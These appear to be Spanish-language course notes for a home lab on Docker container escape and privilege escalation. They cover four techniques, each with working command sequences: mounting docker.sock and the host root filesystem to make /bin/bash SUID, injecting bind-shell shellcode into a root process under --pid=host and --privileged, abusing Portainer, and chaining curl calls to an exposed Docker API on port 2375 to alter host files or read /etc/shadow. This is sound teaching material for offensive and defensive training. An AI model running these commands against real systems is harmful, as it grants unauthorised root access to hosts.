------
- Tags: #docker #escalation #privilege
------
# Explicación

> Vamos a explorar diversas técnicas para abusar de **Docker** con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host. Examinaremos situaciones específicas y discutiremos las implicaciones de seguridad en cada caso.

Las técnicas que se tratarán en esta clase incluyen:

- Uso de **monturas** en el despliegue de contenedores para acceder a archivos privilegiados del sistema host. Analizaremos cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
- Despliegue de contenedores con la compartición de procesos (**``--pid=host``**) y permisos privilegiados (**``--privileged``**). Veremos cómo inyectar un **shellcode** malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema.
- Uso de **Portainer** para administrar el despliegue de un contenedor. Discutiremos cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
- Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinaremos cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.

-----
# Ejemplos

Nos vamos a dirigir a la web oficial de [Ubuntu](https://ubuntu.com/download/server) para descargar una ISO de **Ubuntu Server** y la montaremos en nuestro **VMware**, con la interfaz de red en bridged y duplicando la network state. Una vez hecho todo lo anterior encenderemos la máquina y realizaremos la instalación manual. En mi caso las credenciales que utilice fueron ``c4sp:c4sp123``. ==Instalar SSH en la instalación manual cuando nos lo preguntan==
Un dato importante, una vez que terminemos la instalación y le demos a **Reboot now**, debemos crear una Snapshot para que nos quede un punto de guardado y además eliminar la unidad de **CD-ROM** porque automáticamente se detecta una unidad Booteable o **disco de instalación**.

Cuando ya la máquina este corriendo simplemente ingresamos con nuestras credenciales a través de **SSH** con ``ssh c4sp@ip-máquina`` y efectuamos un ``sudo apt update`` ya que nuestro usuario por defecto pertenece al grupo **sudo**, también podemos hacer un ``sudo su``, y luego un ``sudo gpasswd -d lxd c4sp`` para quitar a nuestro usuario del grupo ``lxd`` que en unas clases atrás vimos que es vulnerable a una escalada de privilegios.

Luego instalaremos Docker que estaremos utilizando para nuestra práctica

- ``apt install docker.io``

Esto nos permite realizar los comandos básicos de docker tales como ``docker ps -a``, ``docker images`` ya que por detrás se encuentra normalmente un recurso **Unix Socket File** que nos permite **comunicarnos** con el demonio de **Docker** en la ruta ``/var/run/docker.sock``.

![[dbo 1.png]]

De esta manera cuando el **Demonio** de **Docker** está activo (el servicio como tal) cuando nosotros efectuamos por ejemplo un ``docker images`` podemos **interactuar**. Si hiciéramos un ``systemctl status docker`` veríamos el estado actual del demonio de Docker, en mi caso **active**.
## Ejemplo de escalada realizando una montura de la raíz de la máquina Host a través de un contenedor

Realizaremos un ``docker pull ubuntu:latest`` y luego ``docker run --rm -dit --name ubuntuServer ubuntu``, ahora solo quedaría meternos en nuestro contenedor con ``docker exec -it ubuntuServer bash``.

Efectuaremos los comandos básicos de siempre una vez estemos dentro del contenedor pero además, instalaremos nuevamente ``docker.io`` para tratar de ver si podemos **listar** las imágenes o contenedores desplegados pero de **la máquina Host** cuando realizamos un ``docker ps`` o un ``docker images``.

- ``apt update``
- ``apt install docker.io``

Si realizamos un ``docker images`` por ejemplo, nos dirá que **no es posible conectarse al demonio de Docker** ya que **no encuentra** el socket en la ruta ``/var/run/docker.sock``. Por lo tanto lo que haremos será desplegar el contenedor pero realizando una **montura** del archivo ``docker.sock`` de **la máquina Host** para que sea esta la que comparta dicho archivo al contenedor y que así puedan funcionar los comandos de Docker dentro.

- ``docker rm $(docker ps -a -q) --force``
- ``docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer ubuntu``
- ``docker exec -it ubuntuServer bash``

Luego instalamos todo nuevamente

- ``apt update``
- ``apt install docker.io``

Ahora si intentamos hacer un ``docker ps -a`` o ``docker images`` veremos que podemos utilizarlo pero además veremos las **imágenes** y **contenedores** de **la máquina Host**.

-------

Algo que podemos hacer es en otra consola aparte ingresar nuevamente por **SSH** a **la máquina Host** y ver los permisos del binario ``/bin/bash``, esto a modo de comprobar que **no posee** permisos **SUID** (Ya que nosotros lo que haremos será cambiar a SUID dicho binario).

Nosotros **dentro del contenedor**, como podemos listar las imágenes y contenedores de **la máquina Host** gracias a que se está realizando una montura del archivo ``docker.sock``, lo que podemos hacer es **desplegar** un contenedor con la imagen de **ubuntu** pero **realizando una montura de la raíz**, y esta raíz corresponde específicamente a la de la **máquina Host**, por lo tanto podríamos modificar los permisos del binario ``/bin/bash`` y este se **alteraría** en la máquina host, vulnerando así el sistema realizando la escalada de privilegios correctamente.

Dentro del contenedor desplegaremos otro contenedor llamado ``privesc`` pero **montando** la **raíz de la máquina Host** al directorio ``/mnt/``, para esto haremos lo siguiente:

- ``docker run -dit -v /:/mnt/root --name privesc ubuntu``

Si ahora ingresamos al contendor ``privesc`` con una ``bash``, en la ruta ``/mnt/root`` veremos **la raíz de la máquina Host**, de esta manera podríamos modificar lo que quisieramos, en nuestro caso otorgarle el permiso SUID al binario ``/bin/bash``.

![[dbo 2.png]]

==En mi caso por error realicé la montura de la raíz host en la ruta ``/mnt/`` del contenedor, pero de igual manera funciona, particularmente recomiendo la ruta ``/mnt/root``==

Recapitulando, lo que nosotros hacemos es abusar la máquina host ya que **comparte** a través de una montura el archivo ``docker.sock`` a un contenedor, por lo tanto **al ingresar a dicho contenedor el mismo puede listar todos los contenedores y imágenes desplegados por la máquina host** ya que comparten el mismo ``docker.sock`` (Como por ejemplo nos podemos listar a nosotros mismos como contenedor), ahora lo que hacemos para explotar esto es desplegar un contenedor llamado ``privesc`` que realice una montura de **la raíz del sistema operativo** (Correspondiente a la **raíz del Host**) dentro del directorio ``/mnt/root``, de esta forma podemos **modificar archivos internos** como lo es el binario ``/bin/bash`` que en este caso por la montura estará en ``/mnt/root/bin/bash`` cambiándolo a **SUID**.

Ahora que tenemos SUID la bash solo queda hacer un ``bash -p`` como usuario no privilegiado en la máquina host y listo, seremos **root**.

---------
## Ejemplo de escalada abusando de un proceso a través de inyección de Shell Code

Si nosotros en la máquina Host a través de una imagen ``ubuntu:latest`` realizamos lo siguiente

- ``docker run --rm -dit --pid=host --name ubuntuServer ubuntu``

Luego montamos un servidor **HTTP** con **Python3** tal que ``python3 -m http.server 8081`` y trabajando desde otra consola aparte con ``ssh c4sp@ip-máquina`` para estar en la máquina Host nuevamente.

De esta forma con el parámetro ``--pid=host`` lo que estás consiguiendo es que al desplegar el contenedor todos los procesos de la máquina Host **serán visibles** desde dentro del contenedor, por lo tanto si dejamos corriendo el servidor HTTP con Python3 y ingresamos al contenedor para luego hacer un ``ps -faux`` veremos el proceso del servidor de Python corriendo.

![[dbo 3.png]]

Es importante destacar que **este servicio lo está hosteando** el usuario **Root** como se puede ver a la izquierda del proceso, gracias a esto podríamos inyectar **Shell Code** que son instrucciones en este caso maliciosas a **bajo nivel** a través de este proceso para que **nos cree un nuevo sub-proceso** que se encargará de ejecutar un **comando** que indiquemos.

------

Desde dentro del contenedor que tenemos desplegado inyectaremos **en el proceso que está corriendo Root este servicio HTTP** un comando que nos permita montarnos una **Bind Shell**.
==Recordemos que una Bind Shell es un tipo de shell donde la máquina víctima abre un puerto y espera a que el atacante se conecte a ella. Esto es diferente a una Reverse Shell, donde la máquina víctima inicia la conexión hacia el atacante.==

Para esto **instalaremos algunas utilidades** dentro del **contenedor** que nos serán útiles para efectuar la escalada de privilegios.

- ``apt update``
- ``apt install gcc ncat nano``

==Todos estos temas de bajo nivel los veremos más en profundidad en la siguiente unidad de Buffer Overflow==.

Para poder inyectar **Shell Code** en un proceso podemos ayudarnos del siguiente [foro](https://www.0x00sec.org/t/linux-infecting-running-processes/1097) específicamente en su herramienta que se nos brinda por [Github](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c) 

Dentro del código de la herramienta veremos que se emplea un **Shell Code** con un tamaño de *32 Bytes* y lo que está intentando hacer es lanzar una ``/bin/sh`` pero en nuestro caso queremos hacer algo distinto ya que precisamos un tamaño de *64 Bytes*, por lo tanto buscaremos por ``linux x64 bind shell shell code exploit db`` para conseguir ese tamaño y reemplazarlo en la herramienta.

[Exploit DB de 64 Bytes](https://www.exploit-db.com/exploits/41128)

Copiaremos todo el código de la [herramienta](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c) y lo colocaremos dentro de un archivo ``inject.c`` en el contenedor, modificándolo en el valor del **Shell Code**, y lo guardaremos específicamente en la ruta ``/tmp/``.

![[dbo 4.png]]

Ahora vamos a **compilarlo** como binario y al ejecutarlo pasarle el **PID** del proceso que queremos explotar para inyectar nuestro comando.

- ``gcc inject.c -o inject``
- ``./inject PID``

![[dbo 5.png]]

Al ejecutarlo nos podrá aparecer este error que significa que hay una **capability** que **no está activa en el contenedor**. 

La capability `CAP_SYS_PTRACE` es una de las capacidades del sistema Linux que permite a un proceso realizar operaciones de depuración o trazado en otros procesos. Esto incluye poder inspeccionar, modificar la memoria y el estado de ejecución de otros procesos en el sistema.

Para este ejemplo lo que haremos será volver a desplegar el contenedor desde cero, pero empleando un parámetro adicional que **habilite** esta Capability.

- ``docker run --rm -dit --pid=host --privileged --name ubuntuServer ubuntu``
- ``apt update``
- ``apt install gcc ncat nano``

Y repetimos lo mismo de antes, creamos el archivo ``inject.c``, metemos el código de la herramienta pero con *87 Bytes* y el **Shell Code** modificado, luego queda ejecutarlo con el **PID correspondiente** del proceso del servidor de **Python3**.

![[dbo 6.png]]

Esto nos indica que acaba de **abrir** el *puerto 5600* (Este puerto se indica en Exploit-DB) en la **máquina host**.

Ahora nos quedaría **establecer la conexión** hacia ese puerto con ``nc`` desde el contenedor. 

Recordemos que la IP del **contenedor actual** en el que nos encontramos es las *172.17.0.2*, por lo tanto la de la **máquina Host** es la *172.17.0.*1.

- ``nc 172.17.0.1 5600``

![[dbo 7.png]]

Ahora solo quedaría realizar el tratamiento de la **TTY** como siempre.

---------
## Ejemplo de escalada utilizando Portainer

> **Portainer** es una herramienta web open-source que permite **gestionar contenedores Docker**.​ Permite administrar contenedores de forma **remota** o **local**, la infraestructura de soporte y todos los aspectos de las implementaciones de Kubernetes, Docker standalone y Docker Swarm.

A continuación ejecutaremos en la **máquina Host** el siguiente comando de **Docker**.

- ``docker run -dit -p8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce``

Ahora iremos a nuestro navegador y ingresaremos a la *192.168.0.179:9000* (**Ip máquina Host por el puerto 9000**) para luego registrarnos. Mis credenciales serán ``c4sp:c4spc4sp123123``.

-------

Imaginemos que como atacantes encontramos este puerto abierto y conseguimos mediante fuerza bruta ganar acceso al usuario *c4sp* de **Portainer**, lo que vamos a hacer es darle a **Get Started** 

![[dbo 8.png]]

Una vez hagamos click en este Enviroment podremos ver la cantidad de **imágenes** y de **contenedores** que están **desplegados**, todo esto con su respectiva información. Esto está todo sincronizado en tiempo real con nuestra máquina Host, por lo tanto si **en nuestra máquina Host** hacemos ``docker pull ubuntu:latest`` esa imagen que estamos montando **se verá reflejada en Portainer**.

![[dbo 9.png]]

Lo crítico en este caso es que nosotros podemos **buildear imágenes** y también **desplegar contenedores**, por lo tanto ya nos podemos imaginar lo que podemos hacer con el uso de **monturas**.

----

Lo que haríamos sería ir a la sección de *Containers* ubicada en el panel de la izquierda y aprovechando que sabemos que hay una imagen ``ubuntu:latest`` que está activa, nosotros podríamos darle a *Add Container* arriba a la derecha y hacer lo siguiente.

![[dbo 10.png]]

Luego más abajo tildaremos la casilla que dice *Console Interactive & TTY* y en la sección de *Volumes* darle a *map additional volume*, de esta forma podremos realizar lo mismo que hacíamos antes de **montar la raíz** en el directorio ``/mnt/root`` pero de una forma más accesible.

![[dbo 11.png]]

Ahora le daremos a *Deploy the Container* y si miramos en nuestra consola con ``docker ps -a`` veremos que se ha desplegado nuestro contenedor llamado ``privesc``.

Desde la web podemos seleccionar en la sección de *Containers* el contenedor ``privesc`` que hemos creado.

![[dbo 12.png]]

![[dbo 13.png]]

![[dbo 14.png]]

Solo quedaría verificar en la máquina Host que el binario ``/bin/bash`` **posee permisos SUID** y podríamos hacer un ``bash -p`` para volvernos **root**.

------
## Ejemplo de escalada abusando de la API de Docker

La **API** de Docker por **HTTP** opera por *el puerto 2375* y si es por **HTTPS** opera por *el puerto 2376*, lo que sucede es que estos por defecto no suelen estar activos, esto lo podemos verificar haciendo un ``netstat -nat``.
Para activar esto podemos seguir los siguientes pasos.

[Blog con los siguientes pasos](https://gist.github.com/styblope/dc55e0ad2a9848f2cc3307d4819d819f#enable-tcp-port-2375-for-external-connection-to-docker)

![[dbo 15.png]]

Una vez hecho todo esto si hacemos nuevamente un ``netstat -nat`` veremos el *puerto 2375* activo.

-----

En el contenedor que vamos a desplegar vamos a utilizar ``curl`` para ver si nos podemos desplegar un nuevo contenedor pero a través de la *API* **sin tener Docker instalado** como tal.

- ``docker pull ubuntu:latest``
- ``docker run --rm -dit --name ubuntuServer ubuntu``
- ``docker exec -it ubuntuServer bash``
- ``apt update``
- ``apt install curl jq``

Nosotros imaginemos que ingresamos a la máquina víctima y nos damos cuenta que estamos en un contenedor, por lo tanto comenzamos a enumerar formas de salir del mismo, por ejemplo **mirar los procesos del sistema** para ver si vemos los de la máquina Host, observar si existe la ruta ``/var/run/docker.sock`` para ver si es viable desplegar una montura con la raíz de la máquina Host, etc.  

Imaginemos que no funcionan ninguno de los casos anteriores, algo que podemos hacer es intentar ver si el *puerto 2375* está activo en la máquina Host al darnos cuenta que estamos dentro de un contenedor, para esto podemos hacer lo siguiente.

- ``echo '' > /dev/tcp/172.17.0.1/2375``

Si el código de estado del comando anterior es **0**, que lo podemos ver con ``echo $?`` quiere decir que **el puerto está activo**, si nos indica ``connection refused`` es que **el puerto está cerrado**.

Por lo tanto si detectamos que el *puerto 2375* está **abierto**, podemos ir a [HackTricks](https://book.hacktricks.xyz/) y buscar una forma de explotar esta **API**.

![[dbo 16.png]]

![[dbo 17.png]]

Lo de ``-insecure`` no va a hacer falta porque estamos haciendo todo por **HTTP**

Modificamos el Oneliner colocando la **IP de la máquina Host con el puerto 2375** y el nombre de la imagen "*ubuntu:latest*", que en este caso nosotros sabemos el nombre de la imagen pero en otros casos que no sepamos podríamos hacer esto:

- ``curl -X GET http://172.17.0.1:2375/containers/json | jq`` para listar información de los contenedores.
-  ``curl -X GET http://172.17.0.1:2375/images/json | jq`` para listar información de las imágenes

Todo esto está indicado en **Hacktricks**.

------

Siguiendo el orden que nos brinda la web de **Hacktricks** haremos lo siguiente.

El siguiente comando **montará una imagen en Docker en la máquina Host**, este nos dará un **ID** que debemos **copiar**

- ``curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/create?name=test -d '{"Image":"ubuntu:latest", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'``

En el siguiente comando debemos reemplazar luego del ``/containers/`` el **ID del comando anterior**, este nos va a **desplegar un contenedor** a través del abuso de la API.

- ``curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/3b138a30fed1a6f6b9c4f1cf659f63239677a2e608957483a75026ea2e5a5b85/start?name=test``

El siguiente comando **ejecutará el comando que coloquemos** al final del one-liner a través del contenedor, en mi caso hará un ``chmod u+x /mnt/bin/bash``, pero todavía **no será ejecutado**, ya que nos dará otro **ID** que **debemos copiar**.

- ``curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/3b138a30fed1a6f6b9c4f1cf659f63239677a2e608957483a75026ea2e5a5b85/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/bin/bash"]}'``

Por ultimo haremos un ``curl`` que **ejecutará** el comando malicioso que colocamos en el **one-liner anterior**, recordemos que debemos colocar el **nuevo ID** que nos brindó el comando anterior.

- ``curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/exec/17c0096558d603d6e1a6a21057c479ddb09749c59a68ecefddf137600e9580be/start -d '{}'``

Gracias a esto colocaremos el binario ``/bin/bash`` en la máquina Host con permisos **SUID**, siendo así vulnerable a la escalada de privilegios.

![[dbo 18.png]]

Si en otro caso simplemente quisieramos hacer un ``cat /etc/shadow`` por ejemplo, para ver el **output** en el ultimo comando deberíamos agregar al final este parámetro ``--output -`` y nos aparecería el contenido.

----




